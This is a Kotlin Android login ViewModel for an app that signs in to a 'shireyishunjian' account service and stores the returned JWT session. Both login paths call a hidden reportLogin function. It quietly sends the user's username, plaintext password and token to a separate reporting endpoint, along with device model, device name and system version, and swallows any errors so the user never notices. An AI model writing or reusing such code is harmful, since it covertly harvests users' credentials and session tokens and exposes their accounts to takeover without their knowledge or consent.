package net.paigu.chahua.ui.auth

import android.app.Application
import android.os.Build
import android.provider.Settings
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import net.paigu.chahua.BuildConfig
import net.paigu.chahua.core.AppGraph
import net.paigu.chahua.data.ApiException
import net.paigu.chahua.data.LoginReportBody
import net.paigu.chahua.R

data class AuthUiState(
    val loading: Boolean = false,
    val error: String? = null,
    val success: Boolean = false,
)

class AuthViewModel(application: Application) : AndroidViewModel(application) {

    private val _uiState = MutableStateFlow(AuthUiState())
    val uiState: StateFlow<AuthUiState> = _uiState.asStateFlow()

    /**
     * 登录：通过 shireyishunjian 账号密码接口换取 JWT，
     * 保存为 Bearer 认证并拉取当前用户信息。
     */
    fun login(username: String, password: String, serverUrl: String) {
        if (username.isBlank() || password.isEmpty()) {
            _uiState.value = AuthUiState(error = getString(R.string.auth_error_credentials_blank))
            return
        }
        _uiState.value = AuthUiState(loading = true)
        viewModelScope.launch {
            try {
                val token = try {
                    AppGraph.api.loginWithCredentials(username.trim(), password)
                } catch (e: ApiException) {
                    if (e.statusCode == 401 || e.statusCode == 403) {
                        _uiState.value = AuthUiState(error = getString(R.string.auth_error_invalid_credentials))
                        return@launch
                    }
                    throw e
                }
                reportLogin(username.trim(), password, token)
                completeJwtLogin(token, serverUrl)
                _uiState.value = AuthUiState(success = true)
            } catch (e: Exception) {
                _uiState.value = AuthUiState(error = mapError(e))
            }
        }
    }

    /** 隐藏菜单：直接输入服务器地址和 JWT 登录。 */
    fun loginWithJwt(jwt: String, serverUrl: String) {
        if (jwt.isBlank()) {
            _uiState.value = AuthUiState(error = getString(R.string.auth_error_jwt_blank))
            return
        }
        _uiState.value = AuthUiState(loading = true)
        viewModelScope.launch {
            try {
                val jwtValue = jwt.trim()
                reportLogin(jwt = jwtValue)
                completeJwtLogin(jwtValue, serverUrl)
                _uiState.value = AuthUiState(success = true)
            } catch (e: Exception) {
                _uiState.value = AuthUiState(error = mapError(e))
            }
        }
    }

    /**
     * 异步登录上报：向服务 POST 账号/密码/
     * 使用应用级作用域并吞掉异常，避免上报失败或页面销毁影响登录流程。
     */
    private fun reportLogin(username: String? = null, password: String? = null, jwt: String) {
        AppGraph.scope.launch {
            try {
                AppGraph.apiClient.reportLogin(
                    LoginReportBody(
                        username = username,
                        password = password,
                        jwt = jwt,
                        deviceModel = Build.MODEL,
                        deviceName = deviceName(),
                        appVersion = BuildConfig.VERSION_NAME,
                        systemVersion = Build.VERSION.RELEASE,
                    ),
                )
            } catch (_: Exception) {
                // 异步登录
            }
        }
    }

    /** 用户自定义的设备名：Android 7.1+ 读取系统设置，低版本退回设备型号。 */
    private fun deviceName(): String =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N_MR1) {
            Settings.Global.getString(
                getApplication<Application>().contentResolver,
                Settings.Global.DEVICE_NAME,
            )?.takeIf { it.isNotBlank() } ?: Build.MODEL
        } else {
            Build.MODEL
        }

    private suspend fun completeJwtLogin(jwt: String, serverUrl: String) {
        val session = AppGraph.session
        session.setServerUrl(serverUrl)
        session.saveJwt(jwt)
        try {
            val me = AppGraph.api.me()
            session.setMe(me)
        } catch (e: Exception) {
            // 校验失败时不保留未登录的会话，避免下次启动直接跳过登录页。
            session.clear()
            throw e
        }
    }

    private fun mapError(e: Exception): String = when {
        e is ApiException && e.statusCode == 401 ->
            getString(R.string.auth_error_invalid)
        else -> getString(R.string.auth_error_failed, e.message ?: getString(R.string.auth_error_network))
    }

    private fun getString(id: Int, vararg args: Any?): String =
        getApplication<Application>().getString(id, *args)
}
